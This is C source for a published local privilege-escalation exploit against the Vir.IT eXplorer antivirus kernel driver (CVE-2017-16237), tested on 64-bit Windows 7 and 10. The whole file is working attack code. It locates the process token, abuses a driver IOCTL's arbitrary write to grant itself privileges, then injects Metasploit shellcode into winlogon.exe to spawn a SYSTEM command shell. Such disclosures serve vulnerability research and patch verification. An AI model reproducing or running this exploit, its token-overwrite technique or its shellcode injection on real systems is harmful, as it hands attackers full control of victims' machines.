﻿/*

Exploit Title    - Vir.IT eXplorer Anti-Virus Arbitrary Write Privilege Escalation
Date             - 1st November 2017
Discovered by    - Parvez Anwar (@parvezghh)
Vendor Homepage  - http://www.tgsoft.it
Tested Version   - 8.5.39
Driver Version   - 1.0.0.11 - VIAGLT64.SYS
Tested on OS     - 64bit Windows 7 and Windows 10 (1709) 
CVE ID           - CVE-2017-16237
Vendor fix url   - n/a
Fixed Version    - 8.5.42
Fixed driver ver - 1.0.0.12


Check blogpost for details:

https://www.greyhathacker.net/?p=990

*/


#include <stdio.h>
#include <windows.h>
#include <TlHelp32.h>

#pragma comment(lib,"advapi32.lib")

#define SystemHandleInformation 16
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xc0000004L)


typedef unsigned __int64 QWORD;


typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO
{
     ULONG       ProcessId;
     UCHAR       ObjectTypeNumber;
     UCHAR       Flags;
     USHORT      Handle;
     QWORD       Object;
     ACCESS_MASK GrantedAccess;
} SYSTEM_HANDLE, *PSYSTEM_HANDLE;


typedef struct _SYSTEM_HANDLE_INFORMATION 
{
     ULONG NumberOfHandles;
     SYSTEM_HANDLE Handles[1];
} SYSTEM_HANDLE_INFORMATION, *PSYSTEM_HANDLE_INFORMATION;


typedef NTSTATUS (WINAPI *_NtQuerySystemInformation)(
     ULONG SystemInformationClass,
     PVOID SystemInformation,
     ULONG SystemInformationLength,
     PULONG ReturnLength);




DWORD getProcessId(char* process)
{
     HANDLE          hSnapShot;
     PROCESSENTRY32  pe32;
     DWORD           pid;


     hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

     if (hSnapShot == INVALID_HANDLE_VALUE) 
     {
         printf("\n[-] Failed to create handle CreateToolhelp32Snapshot()\n\n");
         return -1;
     } 

     pe32.dwSize = sizeof(PROCESSENTRY32);

     if (Process32First(hSnapShot, &pe32) == FALSE)
     {
         printf("\n[-] Failed to call Process32First()\n\n");
         return -1;
     }
        
     do
     {
         if (stricmp(pe32.szExeFile, process) == 0)
         {
             pid = pe32.th32ProcessID;
             return pid;
         }
     } while (Process32Next(hSnapShot, &pe32));

     CloseHandle(hSnapShot);
     return 0;
}


int spawnShell()
{
// windows/x64/exec - 275 bytes http://www.metasploit.com
// VERBOSE=false, PrependMigrate=false, EXITFUNC=thread, CMD=cmd.exe

     char shellcode[] =
     "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50" 
     "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52" 
     "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a" 
     "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41" 
     "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52" 
     "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48" 
     "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40" 
     "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48" 
     "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41" 
     "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1" 
     "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c" 
     "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01" 
     "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a" 
     "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b" 
     "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00" 
     "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b" 
     "\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd" 
     "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0" 
     "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff" 
     "\xd5\x63\x6d\x64\x2e\x65\x78\x65\x00";

     char*     process = "winlogon.exe";
     DWORD     pid;
     HANDLE    hProcess;
     HANDLE    hThread;
     LPVOID    ptrtomem;


     pid = getProcessId(process);

     if ((hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid)) == NULL)
     {
         printf("\n[-] Unable to open %s process\n\n", process);
         return -1;
     }
     printf("\n[+] Opened %s process pid=%d with PROCESS_ALL_ACCESS rights", process, pid);

     if ((ptrtomem = VirtualAllocEx(hProcess, NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE)) == NULL)
     {
         printf("\n[-] Unable to allocate memory in target process\n\n");
         return -1;
     }
     printf("\n[+] Memory allocated at address 0x%p", ptrtomem);

     if (!(WriteProcessMemory(hProcess, (LPVOID)ptrtomem, shellcode, sizeof(shellcode), NULL)))
     {
         printf("\n[-] Unable to write to process memory\n\n");
         return -1;
     }
     printf("\n[+] Written to allocated process memory");
 
     if ((hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)ptrtomem, NULL, 0, NULL)) == NULL)
     {
         CloseHandle(hThread);
         printf("\n[-] Unable to create remote thread\n\n");
         return -1;
     }
     printf("\n[+] Created remote thread and executed\n\n");   

     return 0;
}



QWORD TokenAddressCurrentProcess(HANDLE hProcess, DWORD MyProcessID) 
{
    _NtQuerySystemInformation   NtQuerySystemInformation;
    PSYSTEM_HANDLE_INFORMATION  pSysHandleInfo; 
    ULONG                       i;
    PSYSTEM_HANDLE              pHandle;
    QWORD                       TokenAddress = 0;       
    DWORD                       nSize = 4096;
    DWORD                       nReturn; 
    BOOL                        tProcess;    
    HANDLE                      hToken;


    if ((tProcess = OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) == FALSE)
    {
        printf("\n[-] OpenProcessToken() failed (%d)\n", GetLastError());
        return -1;
    }

    NtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtQuerySystemInformation");
 	
    if (!NtQuerySystemInformation)
    {
        printf("[-] Unable to resolve NtQuerySystemInformation\n\n");
        return -1;  
    }

    do
    {  
        nSize += 4096;
        pSysHandleInfo = (PSYSTEM_HANDLE_INFORMATION) HeapAlloc(GetProcessHeap(), 0, nSize); 
    } while (NtQuerySystemInformation(SystemHandleInformation, pSysHandleInfo, nSize, &nReturn) == STATUS_INFO_LENGTH_MISMATCH);
	
    printf("\n[i] Current process id %d and token handle value %u", MyProcessID, hToken);	

    for (i = 0; i < pSysHandleInfo->NumberOfHandles; i++) 
    {

        if (pSysHandleInfo->Handles[i].ProcessId == MyProcessID && pSysHandleInfo->Handles[i].Handle == hToken) 
        {
            TokenAddress = pSysHandleInfo->Handles[i].Object;	     			  
        }
    }

    HeapFree(GetProcessHeap(), 0, pSysHandleInfo);
    return TokenAddress;	
}



int main(int argc, char *argv[]) 
{

    QWORD      TokenAddressTarget; 
    QWORD      SepPrivilegesOffset = 0x40;
    QWORD      TokenAddress;
    HANDLE     hDevice;
    char       devhandle[MAX_PATH];
    DWORD      dwRetBytes = 0;             
    QWORD      input[3] = {0};     


    printf("-------------------------------------------------------------------------------\n");
    printf("       Vir.IT eXplorer Anti-Virus (VIAGLT64.SYS) Arbitrary Write EoP Exploit   \n");
    printf("                 Tested on 64bit Windows 7 / Windows 10 (1709)                 \n");
    printf("-------------------------------------------------------------------------------\n");

    TokenAddress = TokenAddressCurrentProcess(GetCurrentProcess(), GetCurrentProcessId());
    printf("\n[i] Address of current process token 0x%p", TokenAddress);

    TokenAddressTarget = TokenAddress + SepPrivilegesOffset;
    printf("\n[i] Address of _SEP_TOKEN_PRIVILEGES 0x%p will be overwritten", TokenAddressTarget);

    input[0] = TokenAddressTarget;
    input[1] = 0x0000000602110000;
    input[2] = 0x0000000000110000;
    
    sprintf(devhandle, "\\\\.\\%s", "viragtlt");

    hDevice = CreateFile(devhandle, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING , 0, NULL);
    
    if(hDevice == INVALID_HANDLE_VALUE)
    {
        printf("\n[-] Open %s device failed\n\n", devhandle);
        return -1;
    }
    else 
    {
        printf("\n[+] Open %s device successful", devhandle);
    }	

    printf("\n[~] Press any key to continue . . .\n");
    getch();

    DeviceIoControl(hDevice, 0x8273007C, input, sizeof(input), NULL, 0, &dwRetBytes, NULL); 

    printf("[+] Overwritten _SEP_TOKEN_PRIVILEGES bits\n");
    CloseHandle(hDevice);

    printf("[*] Spawning SYSTEM Shell");
    spawnShell();

    return 0;
}
